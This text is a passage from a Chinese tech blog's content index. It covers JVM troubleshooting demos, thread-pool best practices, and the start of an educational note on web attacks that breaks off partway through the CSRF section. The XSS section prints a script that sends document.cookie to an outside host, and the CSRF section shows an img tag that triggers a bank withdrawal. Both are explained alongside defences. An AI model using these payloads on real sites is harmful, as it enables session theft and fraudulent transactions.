之后就会被回收，如果 ThreadLocal 在 set 之后不进行后续的操作，因为 GC 会把 Key 清除掉，但是 Value 由于线程还在存活，所以 Value 一直不会被回收，最后就会发生内存泄漏。\n/** * 模拟内存泄漏 */ @GetMapping(value = \u0026#34;/memory/leak\u0026#34;) public String leak() { System.out.println(\u0026#34;模拟内存泄漏\u0026#34;); ThreadLocal\u0026lt;Byte[]\u0026gt; localVariable = new ThreadLocal\u0026lt;Byte[]\u0026gt;(); localVariable.set(new Byte[4096 * 1024]);// 为线程添加变量  return \u0026#34;ok\u0026#34;; } 我们给启动加上堆内存大小限制，同时设置内存溢出的时候输出堆栈快照并输出日志。\njava -jar -Xms500m -Xmx500m -XX:+HeapDumpOnOutOfMemoryError -XX:HeapDumpPath=/tmp/heapdump.hprof -XX:+PrintGCTimeStamps -XX:+PrintGCDetails -Xloggc:/tmp/heaplog.log analysis-demo-0.0.1-SNAPSHOT.jar 启动成功后我们循环执行 100 次,for i in {1..500}; do curl localhost:8080/memory/leak;done,还没执行完毕，系统已经返回 500 错误了。查看系统日志出现了如下异常：\njava.lang.OutOfMemoryError: Java heap space 我们用jstat -gc pid 命令来看看程序的 GC 情况。\n很明显，内存溢出了，堆内存经过 45 次 Full Gc 之后都没释放出可用内存，这说明当前堆内存中的对象都是存活的，有 GC Roots 引用，无法回收。那是什么原因导致内存溢出呢？是不是我只要加大内存就行了呢？如果是普通的内存溢出也许扩大内存就行了，但是如果是内存泄漏的话，扩大的内存不一会就会被占满，所以我们还需要确定是不是内存泄漏。我们之前保存了堆 Dump 文件，这个时候借助我们的 MAT 工具来分析下。导入工具选择Leak Suspects Report，工具直接就会给你列出问题报告。\n这里已经列出了可疑的 4 个内存泄漏问题，我们点击其中一个查看详情。\n这里已经指出了内存被线程占用了接近 50M 的内存，占用的对象就是 ThreadLocal。如果想详细的通过手动去分析的话，可以点击Histogram,查看最大的对象占用是谁，然后再分析它的引用关系，即可确定是谁导致的内存溢出。\n上图发现占用内存最大的对象是一个 Byte 数组，我们看看它到底被那个 GC Root 引用导致没有被回收。按照上图红框操作指引，结果如下图：\n我们发现 Byte 数组是被线程对象引用的，图中也标明，Byte 数组对像的 GC Root 是线程，所以它是不会被回收的，展开详细信息查看，我们发现最终的内存占用对象是被 ThreadLocal 对象占据了。这也和 MAT 工具自动帮我们分析的结果一致。\n死锁    死锁会导致耗尽线程资源，占用内存，表现就是内存占用升高，CPU 不一定会飙升(看场景决定)，如果是直接 new 线程，会导致 JVM 内存被耗尽，报无法创建线程的错误，这也是体现了使用线程池的好处。\nExecutorService service = new ThreadPoolExecutor(4, 10, 0, TimeUnit.SECONDS, new LinkedBlockingQueue\u0026lt;Runnable\u0026gt;(1024), Executors.defaultThreadFactory(), new ThreadPoolExecutor.AbortPolicy()); /** * 模拟死锁 */ @GetMapping(\u0026#34;/cpu/test\u0026#34;) public String testCPU() throws InterruptedException { System.out.println(\u0026#34;请求cpu\u0026#34;); Object lock1 = new Object(); Object lock2 = new Object(); service.submit(new DeadLockThread(lock1, lock2), \u0026#34;deadLookThread-\u0026#34; + new Random().nextInt()); service.submit(new DeadLockThread(lock2, lock1), \u0026#34;deadLookThread-\u0026#34; + new Random().nextInt()); return \u0026#34;ok\u0026#34;; } public class DeadLockThread implements Runnable { private Object lock1; private Object lock2; public DeadLockThread1(Object lock1, Object lock2) { this.lock1 = lock1; this.lock2 = lock2; } @Override public void run() { synchronized (lock2) { System.out.println(Thread.currentThread().getName()+\u0026#34;get lock2 and wait lock1\u0026#34;); try { TimeUnit.MILLISECONDS.sleep(2000); } catch (InterruptedException e) { e.printStackTrace(); } synchronized (lock1) { System.out.println(Thread.currentThread().getName()+\u0026#34;get lock1 and lock2 \u0026#34;); } } } } 我们循环请求接口 2000 次，发现不一会系统就出现了日志错误，线程池和队列都满了,由于我选择的当队列满了就拒绝的策略，所以系统直接抛出异常。\njava.util.concurrent.RejectedExecutionException: Task java.util.concurrent.FutureTask@2760298 rejected from java.util.concurrent.ThreadPoolExecutor@7ea7cd51[Running, pool size = 10, active threads = 10, queued tasks = 1024, completed tasks = 846] 通过ps -ef|grep java命令找出 Java 进程 pid，执行jstack pid 即可出现 java 线程堆栈信息，这里发现了 5 个死锁，我们只列出其中一个，很明显线程pool-1-thread-2锁住了0x00000000f8387d88等待0x00000000f8387d98锁，线程pool-1-thread-1锁住了0x00000000f8387d98等待锁0x00000000f8387d88,这就产生了死锁。\nJava stack information for the threads listed above: =================================================== \u0026#34;pool-1-thread-2\u0026#34;: at top.luozhou.analysisdemo.controller.DeadLockThread2.run(DeadLockThread.java:30) - waiting to lock \u0026lt;0x00000000f8387d98\u0026gt; (a java.lang.Object) - locked \u0026lt;0x00000000f8387d88\u0026gt; (a java.lang.Object) at java.util.concurrent.Executors$RunnableAdapter.call(Executors.java:511) at java.util.concurrent.FutureTask.run(FutureTask.java:266) at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1149) at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:624) at java.lang.Thread.run(Thread.java:748) \u0026#34;pool-1-thread-1\u0026#34;: at top.luozhou.analysisdemo.controller.DeadLockThread1.run(DeadLockThread.java:30) - waiting to lock \u0026lt;0x00000000f8387d88\u0026gt; (a java.lang.Object) - locked \u0026lt;0x00000000f8387d98\u0026gt; (a java.lang.Object) at java.util.concurrent.Executors$RunnableAdapter.call(Executors.java:511) at java.util.concurrent.FutureTask.run(FutureTask.java:266) at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1149) at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:624) at java.lang.Thread.run(Thread.java:748) Found 5 deadlocks. 线程频繁切换    上下文切换会导致将大量 CPU 时间浪费在寄存器、内核栈以及虚拟内存的保存和恢复上，导致系统整体性能下降。当你发现系统的性能出现明显的下降时候，需要考虑是否发生了大量的线程上下文切换。\n@GetMapping(value = \u0026#34;/thread/swap\u0026#34;) public String theadSwap(int num) { System.out.println(\u0026#34;模拟线程切换\u0026#34;); for (int i = 0; i \u0026lt; num; i++) { new Thread(new ThreadSwap1(new AtomicInteger(0)),\u0026#34;thread-swap\u0026#34;+i).start(); } return \u0026#34;ok\u0026#34;; } public class ThreadSwap1 implements Runnable { private AtomicInteger integer; public ThreadSwap1(AtomicInteger integer) { this.integer = integer; } @Override public void run() { while (true) { integer.addAndGet(1); Thread.yield(); //让出CPU资源  } } } 这里我创建多个线程去执行基础的原子+1 操作，然后让出 CPU 资源，理论上 CPU 就会去调度别的线程，我们请求接口创建 100 个线程看看效果如何，curl localhost:8080/thread/swap?num=100。接口请求成功后，我们执行 vmstat 1 10，表示每 1 秒打印一次，打印 10 次，线程切换采集结果如下：\nprocs -----------memory---------- ---swap-- -----io---- -system-- ------cpu----- r b swpd free buff cache si so bi bo in cs us sy id wa st 101 0 128000 878384 908 468684 0 0 0 0 4071 8110498 14 86 0 0 0 100 0 128000 878384 908 468684 0 0 0 0 4065 8312463 15 85 0 0 0 100 0 128000 878384 908 468684 0 0 0 0 4107 8207718 14 87 0 0 0 100 0 128000 878384 908 468684 0 0 0 0 4083 8410174 14 86 0 0 0 100 0 128000 878384 908 468684 0 0 0 0 4083 8264377 14 86 0 0 0 100 0 128000 878384 908 468688 0 0 0 108 4182 8346826 14 86 0 0 0 这里我们关注 4 个指标，r,cs,us,sy。\nr=100,说明等待的进程数量是 100，线程有阻塞。\ncs=800 多万，说明每秒上下文切换了 800 多万次，这个数字相当大了。\nus=14，说明用户态占用了 14%的 CPU 时间片去处理逻辑。\nsy=86，说明内核态占用了 86%的 CPU，这里明显就是做上下文切换工作了。\n我们通过top命令以及top -Hp pid查看进程和线程 CPU 情况，发现 Java 线程 CPU 占满了，但是线程 CPU 使用情况很平均，没有某一个线程把 CPU 吃满的情况。\nPID USER PR NI VIRT RES SHR S %CPU %MEM TIME+ COMMAND 87093 root 20 0 4194788 299056 13252 S 399.7 16.1 65:34.67 java  PID USER PR NI VIRT RES SHR S %CPU %MEM TIME+ COMMAND 87189 root 20 0 4194788 299056 13252 R 4.7 16.1 0:41.11 java 87129 root 20 0 4194788 299056 13252 R 4.3 16.1 0:41.14 java 87130 root 20 0 4194788 299056 13252 R 4.3 16.1 0:40.51 java 87133 root 20 0 4194788 299056 13252 R 4.3 16.1 0:40.59 java 87134 root 20 0 4194788 299056 13252 R 4.3 16.1 0:40.95 java 结合上面用户态 CPU 只使用了 14%，内核态 CPU 占用了 86%，可以基本判断是 Java 程序线程上下文切换导致性能问题。\n我们使用pidstat命令来看看 Java 进程内部的线程切换数据，执行pidstat -p 87093 -w 1 10,采集数据如下：\n11:04:30 PM UID TGID TID cswch/s nvcswch/s Command 11:04:30 PM 0 - 87128 0.00 16.07 |__java 11:04:30 PM 0 - 87129 0.00 15.60 |__java 11:04:30 PM 0 - 87130 0.00 15.54 |__java 11:04:30 PM 0 - 87131 0.00 15.60 |__java 11:04:30 PM 0 - 87132 0.00 15.43 |__java 11:04:30 PM 0 - 87133 0.00 16.02 |__java 11:04:30 PM 0 - 87134 0.00 15.66 |__java 11:04:30 PM 0 - 87135 0.00 15.23 |__java 11:04:30 PM 0 - 87136 0.00 15.33 |__java 11:04:30 PM 0 - 87137 0.00 16.04 |__java 根据上面采集的信息，我们知道 Java 的线程每秒切换 15 次左右，正常情况下，应该是个位数或者小数。结合这些信息我们可以断定 Java 线程开启过多，导致频繁上下文切换，从而影响了整体性能。\n为什么系统的上下文切换是每秒 800 多万，而 Java 进程中的某一个线程切换才 15 次左右？\n系统上下文切换分为三种情况:\n1、多任务：在多任务环境中，一个进程被切换出 CPU，运行另外一个进程，这里会发生上下文切换。\n2、中断处理：发生中断时，硬件会切换上下文。在 vmstat 命令中是in\n3、用户和内核模式切换：当操作系统中需要在用户模式和内核模式之间进行转换时，需要进行上下文切换,比如进行系统函数调用。\nLinux 为每个 CPU 维护了一个就绪队列，将活跃进程按照优先级和等待 CPU 的时间排序，然后选择最需要 CPU 的进程，也就是优先级最高和等待 CPU 时间最长的进程来运行。也就是 vmstat 命令中的r。\n那么，进程在什么时候才会被调度到 CPU 上运行呢？\n 进程执行完终止了，它之前使用的 CPU 会释放出来，这时再从就绪队列中拿一个新的进程来运行 为了保证所有进程可以得到公平调度，CPU 时间被划分为一段段的时间片，这些时间片被轮流分配给各个进程。当某个进程时间片耗尽了就会被系统挂起，切换到其它等待 CPU 的进程运行。 进程在系统资源不足时，要等待资源满足后才可以运行，这时进程也会被挂起，并由系统调度其它进程运行。 当进程通过睡眠函数 sleep 主动挂起时，也会重新调度。 当有优先级更高的进程运行时，为了保证高优先级进程的运行，当前进程会被挂起，由高优先级进程来运行。 发生硬件中断时，CPU 上的进程会被中断挂起，转而执行内核中的中断服务程序。  结合我们之前的内容分析，阻塞的就绪队列是 100 左右，而我们的 CPU 只有 4 核，这部分原因造成的上下文切换就可能会相当高，再加上中断次数是 4000 左右和系统的函数调用等，整个系统的上下文切换到 800 万也不足为奇了。Java 内部的线程切换才 15 次，是因为线程使用Thread.yield()来让出 CPU 资源，但是 CPU 有可能继续调度该线程，这个时候线程之间并没有切换，这也是为什么内部的某个线程切换次数并不是非常大的原因。\n总结    本文模拟了常见的性能问题场景，分析了如何定位 CPU100%、内存泄漏、死锁、线程频繁切换问题。分析问题我们需要做好两件事，第一，掌握基本的原理，第二，借助好工具。本文也列举了分析问题的常用工具和命令，希望对你解决问题有所帮助。当然真正的线上环境可能十分复杂，并没有模拟的环境那么简单，但是原理是一样的，问题的表现也是类似的，我们重点抓住原理，活学活用，相信复杂的线上问题也可以顺利解决。\n参考    1、https://linux.die.net/man/1/pidstat\n2、https://linux.die.net/man/8/vmstat\n3、https://help.eclipse.org/2020-03/index.jsp?topic=/org.eclipse.mat.ui.help/welcome.html\n4、https://www.linuxblogs.cn/articles/18120200.html\n5、https://www.tutorialspoint.com/what-is-context-switching-in-operating-system\n"},{"id":346,"href":"/java/multi-thread/%E6%8B%BF%E6%9D%A5%E5%8D%B3%E7%94%A8%E7%9A%84%E7%BA%BF%E7%A8%8B%E6%B1%A0%E6%9C%80%E4%BD%B3%E5%AE%9E%E8%B7%B5/","title":"拿来即用的线程池最佳实践","parent":"multi-thread","content":"线程池最佳实践    这篇文章篇幅虽短，但是绝对是干货。标题稍微有点夸张，嘿嘿，实际都是自己使用线程池的时候总结的一些个人感觉比较重要的点。\n线程池知识回顾    开始这篇文章之前还是简单介绍一嘴线程池，之前写的《新手也能看懂的线程池学习总结》这篇文章介绍的很详细了。\n为什么要使用线程池？     池化技术想必大家已经屡见不鲜了，线程池、数据库连接池、Http 连接池等等都是对这个思想的应用。池化技术的思想主要是为了减少每次获取资源的消耗，提高对资源的利用率。\n 线程池提供了一种限制和管理资源（包括执行一个任务）。 每个线程池还维护一些基本统计信息，例如已完成任务的数量。\n这里借用《Java 并发编程的艺术》提到的来说一下使用线程池的好处：\n 降低资源消耗。通过重复利用已创建的线程降低线程创建和销毁造成的消耗。 提高响应速度。当任务到达时，任务可以不需要等到线程创建就能立即执行。 提高线程的可管理性。线程是稀缺资源，如果无限制的创建，不仅会消耗系统资源，还会降低系统的稳定性，使用线程池可以进行统一的分配，调优和监控。  线程池在实际项目的使用场景    线程池一般用于执行多个不相关联的耗时任务，没有多线程的情况下，任务顺序执行，使用了线程池的话可让多个不相关联的任务同时执行。\n假设我们要执行三个不相关的耗时任务，Guide 画图给大家展示了使用线程池前后的区别。\n注意：下面三个任务可能做的是同一件事情，也可能是不一样的事情。\n如何使用线程池？    一般是通过 ThreadPoolExecutor 的构造函数来创建线程池，然后提交任务给线程池执行就可以了。\nThreadPoolExecutor构造函数如下：\n/** * 用给定的初始参数创建一个新的ThreadPoolExecutor。 */ public ThreadPoolExecutor(int corePoolSize,//线程池的核心线程数量  int maximumPoolSize,//线程池的最大线程数  long keepAliveTime,//当线程数大于核心线程数时，多余的空闲线程存活的最长时间  TimeUnit unit,//时间单位  BlockingQueue\u0026lt;Runnable\u0026gt; workQueue,//任务队列，用来储存等待执行任务的队列  ThreadFactory threadFactory,//线程工厂，用来创建线程，一般默认即可  RejectedExecutionHandler handler//拒绝策略，当提交的任务过多而不能及时处理时，我们可以定制策略来处理任务  ) { if (corePoolSize \u0026lt; 0 || maximumPoolSize \u0026lt;= 0 || maximumPoolSize \u0026lt; corePoolSize || keepAliveTime \u0026lt; 0) throw new IllegalArgumentException(); if (workQueue == null || threadFactory == null || handler == null) throw new NullPointerException(); this.corePoolSize = corePoolSize; this.maximumPoolSize = maximumPoolSize; this.workQueue = workQueue; this.keepAliveTime = unit.toNanos(keepAliveTime); this.threadFactory = threadFactory; this.handler = handler; } 简单演示一下如何使用线程池，更详细的介绍，请看：《新手也能看懂的线程池学习总结》 。\nprivate static final int CORE_POOL_SIZE = 5; private static final int MAX_POOL_SIZE = 10; private static final int QUEUE_CAPACITY = 100; private static final Long KEEP_ALIVE_TIME = 1L; public static void main(String[] args) { //使用阿里巴巴推荐的创建线程池的方式  //通过ThreadPoolExecutor构造函数自定义参数创建  ThreadPoolExecutor executor = new ThreadPoolExecutor( CORE_POOL_SIZE, MAX_POOL_SIZE, KEEP_ALIVE_TIME, TimeUnit.SECONDS, new ArrayBlockingQueue\u0026lt;\u0026gt;(QUEUE_CAPACITY), new ThreadPoolExecutor.CallerRunsPolicy()); for (int i = 0; i \u0026lt; 10; i++) { executor.execute(() -\u0026gt; { try { Thread.sleep(2000); } catch (InterruptedException e) { e.printStackTrace(); } System.out.println(\u0026#34;CurrentThread name:\u0026#34; + Thread.currentThread().getName() + \u0026#34;date：\u0026#34; + Instant.now()); }); } //终止线程池  executor.shutdown(); try { executor.awaitTermination(5, TimeUnit.SECONDS); } catch (InterruptedException e) { e.printStackTrace(); } System.out.println(\u0026#34;Finished all threads\u0026#34;); } 控制台输出：\nCurrentThread name:pool-1-thread-5date：2020-06-06T11:45:31.639Z CurrentThread name:pool-1-thread-3date：2020-06-06T11:45:31.639Z CurrentThread name:pool-1-thread-1date：2020-06-06T11:45:31.636Z CurrentThread name:pool-1-thread-4date：2020-06-06T11:45:31.639Z CurrentThread name:pool-1-thread-2date：2020-06-06T11:45:31.639Z CurrentThread name:pool-1-thread-2date：2020-06-06T11:45:33.656Z CurrentThread name:pool-1-thread-4date：2020-06-06T11:45:33.656Z CurrentThread name:pool-1-thread-1date：2020-06-06T11:45:33.656Z CurrentThread name:pool-1-thread-3date：2020-06-06T11:45:33.656Z CurrentThread name:pool-1-thread-5date：2020-06-06T11:45:33.656Z Finished all threads 线程池最佳实践    简单总结一下我了解的使用线程池的时候应该注意的东西，网上似乎还没有专门写这方面的文章。\n因为Guide还比较菜，有补充和完善的地方，可以在评论区告知或者在微信上与我交流。\n1. 使用 ThreadPoolExecutor  的构造函数声明线程池    1. 线程池必须手动通过 ThreadPoolExecutor  的构造函数来声明，避免使用Executors  类的 newFixedThreadPool 和 newCachedThreadPool ，因为可能会有 OOM 的风险。\n Executors 返回线程池对象的弊端如下：\n FixedThreadPool 和 SingleThreadExecutor ： 允许请求的队列长度为 Integer.MAX_VALUE,可能堆积大量的请求，从而导致 OOM。 CachedThreadPool 和 ScheduledThreadPool ： 允许创建的线程数量为 Integer.MAX_VALUE ，可能会创建大量线程，从而导致 OOM。   说白了就是：使用有界队列，控制线程创建数量。\n除了避免 OOM 的原因之外，不推荐使用 Executors 提供的两种快捷的线程池的原因还有：\n 实际使用中需要根据自己机器的性能、业务场景来手动配置线程池的参数比如核心线程数、使用的任务队列、饱和策略等等。 我们应该显示地给我们的线程池命名，这样有助于我们定位问题。  2.监测线程池运行状态    你可以通过一些手段来检测线程池的运行状态比如 SpringBoot 中的 Actuator 组件。\n除此之外，我们还可以利用 ThreadPoolExecutor 的相关 API做一个简陋的监控。从下图可以看出， ThreadPoolExecutor提供了获取线程池当前的线程数和活跃线程数、已经执行完成的任务数、正在排队中的任务数等等。\n下面是一个简单的 Demo。printThreadPoolStatus()会每隔一秒打印出线程池的线程数、活跃线程数、完成的任务数、以及队列中的任务数。\n/** * 打印线程池的状态 * * @param threadPool 线程池对象 */ public static void printThreadPoolStatus(ThreadPoolExecutor threadPool) { ScheduledExecutorService scheduledExecutorService = new ScheduledThreadPoolExecutor(1, createThreadFactory(\u0026#34;print-images/thread-pool-status\u0026#34;, false)); scheduledExecutorService.scheduleAtFixedRate(() -\u0026gt; { log.info(\u0026#34;=========================\u0026#34;); log.info(\u0026#34;ThreadPool Size: [{}]\u0026#34;, threadPool.getPoolSize()); log.info(\u0026#34;Active Threads: {}\u0026#34;, threadPool.getActiveCount()); log.info(\u0026#34;Number of Tasks : {}\u0026#34;, threadPool.getCompletedTaskCount()); log.info(\u0026#34;Number of Tasks in Queue: {}\u0026#34;, threadPool.getQueue().size()); log.info(\u0026#34;=========================\u0026#34;); }, 0, 1, TimeUnit.SECONDS); } 3.建议不同类别的业务用不同的线程池    很多人在实际项目中都会有类似这样的问题：我的项目中多个业务需要用到线程池，是为每个线程池都定义一个还是说定义一个公共的线程池呢？\n一般建议是不同的业务使用不同的线程池，配置线程池的时候根据当前业务的情况对当前线程池进行配置，因为不同的业务的并发以及对资源的使用情况都不同，重心优化系统性能瓶颈相关的业务。\n我们再来看一个真实的事故案例！ (本案例来源自：《线程池运用不当的一次线上事故》 ，很精彩的一个案例)\n上面的代码可能会存在死锁的情况，为什么呢？画个图给大家捋一捋。\n试想这样一种极端情况：假如我们线程池的核心线程数为 n，父任务（扣费任务）数量为 n，父任务下面有两个子任务（扣费任务下的子任务），其中一个已经执行完成，另外一个被放在了任务队列中。由于父任务把线程池核心线程资源用完，所以子任务因为无法获取到线程资源无法正常执行，一直被阻塞在队列中。父任务等待子任务执行完成，而子任务等待父任务释放线程池资源，这也就造成了 \u0026ldquo;死锁\u0026rdquo;。\n解决方法也很简单，就是新增加一个用于执行子任务的线程池专门为其服务。\n4.别忘记给线程池命名    初始化线程池的时候需要显示命名（设置线程池名称前缀），有利于定位问题。\n默认情况下创建的线程名字类似 pool-1-thread-n 这样的，没有业务含义，不利于我们定位问题。\n给线程池里的线程命名通常有下面两种方式：\n**1.利用 guava 的 ThreadFactoryBuilder **\nThreadFactory threadFactory = new ThreadFactoryBuilder() .setNameFormat(threadNamePrefix + \u0026#34;-%d\u0026#34;) .setDaemon(true).build(); ExecutorService threadPool = new ThreadPoolExecutor(corePoolSize, maximumPoolSize, keepAliveTime, TimeUnit.MINUTES, workQueue, threadFactory) 2.自己实现 ThreadFactor。\nimport java.util.concurrent.Executors; import java.util.concurrent.ThreadFactory; import java.util.concurrent.atomic.AtomicInteger; /** * 线程工厂，它设置线程名称，有利于我们定位问题。 */ public final class NamingThreadFactory implements ThreadFactory { private final AtomicInteger threadNum = new AtomicInteger(); private final ThreadFactory delegate; private final String name; /** * 创建一个带名字的线程池生产工厂 */ public NamingThreadFactory(ThreadFactory delegate, String name) { this.delegate = delegate; this.name = name; // TODO consider uniquifying this  } @Override public Thread newThread(Runnable r) { Thread t = delegate.newThread(r); t.setName(name + \u0026#34; [#\u0026#34; + threadNum.incrementAndGet() + \u0026#34;]\u0026#34;); return t; } } 5.正确配置线程池参数    说到如何给线程池配置参数，美团的骚操作至今让我难忘（后面会提到）！\n我们先来看一下各种书籍和博客上一般推荐的配置线程池参数的方式，可以作为参考！\n常规操作    很多人甚至可能都会觉得把线程池配置过大一点比较好！我觉得这明显是有问题的。就拿我们生活中非常常见的一例子来说：并不是人多就能把事情做好，增加了沟通交流成本。你本来一件事情只需要 3 个人做，你硬是拉来了 6 个人，会提升做事效率嘛？我想并不会。 线程数量过多的影响也是和我们分配多少人做事情一样，对于多线程这个场景来说主要是增加了上下文切换成本。不清楚什么是上下文切换的话，可以看我下面的介绍。\n 上下文切换：\n多线程编程中一般线程的个数都大于 CPU 核心的个数，而一个 CPU 核心在任意时刻只能被一个线程使用，为了让这些线程都能得到有效执行，CPU 采取的策略是为每个线程分配时间片并轮转的形式。当一个线程的时间片用完的时候就会重新处于就绪状态让给其他线程使用，这个过程就属于一次上下文切换。概括来说就是：当前任务在执行完 CPU 时间片切换到另一个任务之前会先保存自己的状态，以便下次再切换回这个任务时，可以再加载这个任务的状态。任务从保存到再加载的过程就是一次上下文切换。\n上下文切换通常是计算密集型的。也就是说，它需要相当可观的处理器时间，在每秒几十上百次的切换中，每次切换都需要纳秒量级的时间。所以，上下文切换对系统来说意味着消耗大量的 CPU 时间，事实上，可能是操作系统中时间消耗最大的操作。\nLinux 相比与其他操作系统（包括其他类 Unix 系统）有很多的优点，其中有一项就是，其上下文切换和模式切换的时间消耗非常少。\n 类比于实现世界中的人类通过合作做某件事情，我们可以肯定的一点是线程池大小设置过大或者过小都会有问题，合适的才是最好。\n如果我们设置的线程池数量太小的话，如果同一时间有大量任务/请求需要处理，可能会导致大量的请求/任务在任务队列中排队等待执行，甚至会出现任务队列满了之后任务/请求无法处理的情况，或者大量任务堆积在任务队列导致 OOM。这样很明显是有问题的！ CPU 根本没有得到充分利用。\n但是，如果我们设置线程数量太大，大量线程可能会同时在争取 CPU 资源，这样会导致大量的上下文切换，从而增加线程的执行时间，影响了整体执行效率。\n有一个简单并且适用面比较广的公式：\n CPU 密集型任务(N+1)： 这种任务消耗的主要是 CPU 资源，可以将线程数设置为 N（CPU 核心数）+1，比 CPU 核心数多出来的一个线程是为了防止线程偶发的缺页中断，或者其它原因导致的任务暂停而带来的影响。一旦任务暂停，CPU 就会处于空闲状态，而在这种情况下多出来的一个线程就可以充分利用 CPU 的空闲时间。 I/O 密集型任务(2N)： 这种任务应用起来，系统会用大部分的时间来处理 I/O 交互，而线程在处理 I/O 的时间段内不会占用 CPU 来处理，这时就可以将 CPU 交出给其它线程使用。因此在 I/O 密集型任务的应用中，我们可以多配置一些线程，具体的计算方法是 2N。  如何判断是 CPU 密集任务还是 IO 密集任务？\nCPU 密集型简单理解就是利用 CPU 计算能力的任务比如你在内存中对大量数据进行排序。但凡涉及到网络读取，文件读取这类都是 IO 密集型，这类任务的特点是 CPU 计算耗费时间相比于等待 IO 操作完成的时间来说很少，大部分时间都花在了等待 IO 操作完成上。\n美团的骚操作    美团技术团队在《Java线程池实现原理及其在美团业务中的实践》这篇文章中介绍到对线程池参数实现可自定义配置的思路和方法。\n美团技术团队的思路是主要对线程池的核心参数实现自定义可配置。这三个核心参数是：\n corePoolSize : 核心线程数线程数定义了最小可以同时运行的线程数量。 maximumPoolSize : 当队列中存放的任务达到队列容量的时候，当前可以同时运行的线程数量变为最大线程数。 workQueue: 当新任务来的时候会先判断当前运行的线程数量是否达到核心线程数，如果达到的话，新任务就会被存放在队列中。  为什么是这三个参数？\n我在这篇《新手也能看懂的线程池学习总结》 中就说过这三个参数是 ThreadPoolExecutor 最重要的参数，它们基本决定了线程池对于任务的处理策略。\n如何支持参数动态配置？ 且看 ThreadPoolExecutor 提供的下面这些方法。\n格外需要注意的是corePoolSize， 程序运行期间的时候，我们调用 setCorePoolSize（） 这个方法的话，线程池会首先判断当前工作线程数是否大于corePoolSize，如果大于的话就会回收工作线程。\n另外，你也看到了上面并没有动态指定队列长度的方法，美团的方式是自定义了一个叫做 ResizableCapacityLinkedBlockIngQueue 的队列（主要就是把LinkedBlockingQueue的capacity 字段的final关键字修饰给去掉了，让它变为可变的）。\n最终实现的可动态修改线程池参数效果如下。👏👏👏\n还没看够？推荐 why神的《如何设置线程池参数？美团给出了一个让面试官虎躯一震的回答。》这篇文章，深度剖析，很不错哦！\n"},{"id":347,"href":"/%E7%AC%94%E8%AE%B0/%E6%94%BB%E5%87%BB%E6%8A%80%E6%9C%AF/","title":"攻击技术","parent":"笔记","content":"攻击技术     攻击技术  一、跨站脚本攻击 二、跨站请求伪造 三、SQL 注入攻击 四、拒绝服务攻击 参考资料    一、跨站脚本攻击    概念    跨站脚本攻击（Cross-Site Scripting, XSS），可以将代码注入到用户浏览的网页上，这种代码包括 HTML 和 JavaScript。\n攻击原理    例如有一个论坛网站，攻击者可以在上面发布以下内容：\n\u0026lt;script\u0026gt;location.href=\u0026#34;//domain.com/?c=\u0026#34; + document.cookie\u0026lt;/script\u0026gt; 之后该内容可能会被渲染成以下形式：\n\u0026lt;p\u0026gt;\u0026lt;script\u0026gt;location.href=\u0026#34;//domain.com/?c=\u0026#34; + document.cookie\u0026lt;/script\u0026gt;\u0026lt;/p\u0026gt; 另一个用户浏览了含有这个内容的页面将会跳转到 domain.com 并携带了当前作用域的 Cookie。如果这个论坛网站通过 Cookie 管理用户登录状态，那么攻击者就可以通过这个 Cookie 登录被攻击者的账号了。\n危害     窃取用户的 Cookie 伪造虚假的输入表单骗取个人信息 显示伪造的文章或者图片  防范手段    1. 设置 Cookie 为 HttpOnly    设置了 HttpOnly 的 Cookie 可以防止 JavaScript 脚本调用，就无法通过 document.cookie 获取用户 Cookie 信息。\n2. 过滤特殊字符    例如将 \u0026lt; 转义为 \u0026amp;lt;，将 \u0026gt; 转义为 \u0026amp;gt;，从而避免 HTML 和 Jascript 代码的运行。\n富文本编辑器允许用户输入 HTML 代码，就不能简单地将 \u0026lt; 等字符进行过滤了，极大地提高了 XSS 攻击的可能性。\n富文本编辑器通常采用 XSS filter 来防范 XSS 攻击，通过定义一些标签白名单或者黑名单，从而不允许有攻击性的 HTML 代码的输入。\n以下例子中，form 和 script 等标签都被转义，而 h 和 p 等标签将会保留。\n\u0026lt;h1 id=\u0026#34;title\u0026#34;\u0026gt;XSS Demo\u0026lt;/h1\u0026gt; \u0026lt;p\u0026gt;123\u0026lt;/p\u0026gt; \u0026lt;form\u0026gt; \u0026lt;input type=\u0026#34;text\u0026#34; name=\u0026#34;q\u0026#34; value=\u0026#34;test\u0026#34;\u0026gt; \u0026lt;/form\u0026gt; \u0026lt;pre\u0026gt;hello\u0026lt;/pre\u0026gt; \u0026lt;script type=\u0026#34;text/javascript\u0026#34;\u0026gt; alert(/xss/); \u0026lt;/script\u0026gt; \u0026lt;h1\u0026gt;XSS Demo\u0026lt;/h1\u0026gt; \u0026lt;p\u0026gt;123\u0026lt;/p\u0026gt; \u0026amp;lt;form\u0026amp;gt; \u0026amp;lt;input type=\u0026#34;text\u0026#34; name=\u0026#34;q\u0026#34; value=\u0026#34;test\u0026#34;\u0026amp;gt; \u0026amp;lt;/form\u0026amp;gt; \u0026lt;pre\u0026gt;hello\u0026lt;/pre\u0026gt; \u0026amp;lt;script type=\u0026#34;text/javascript\u0026#34;\u0026amp;gt; alert(/xss/); \u0026amp;lt;/script\u0026amp;gt;  XSS 过滤在线测试\n 二、跨站请求伪造    概念    跨站请求伪造（Cross-site request forgery，CSRF），是攻击者通过一些技术手段欺骗用户的浏览器去访问一个自己曾经认证过的网站并执行一些操作（如发邮件，发消息，甚至财产操作如转账和购买商品）。由于浏览器曾经认证过，所以被访问的网站会认为是真正的用户操作而去执行。\nXSS 利用的是用户对指定网站的信任，CSRF 利用的是网站对用户浏览器的信任。\n攻击原理    假如一家银行用以执行转账操作的 URL 地址如下：\nhttp://www.examplebank.com/withdraw?account=AccoutName\u0026amp;amount=1000\u0026amp;for=PayeeName。 那么，一个恶意攻击者可以在另一个网站上放置如下代码：\n\u0026lt;img src=\u0026quot;http://www.examplebank.com/withdraw?account=Alice\u0026amp;amount=1000\u0026amp;for=Badman\u0026quot;\u0026gt;。 如果有账户名为 Alice 的用户访问了恶意站点，而她之前刚访问过银行不久，登录信息尚未过期，那么她就会损失 1000 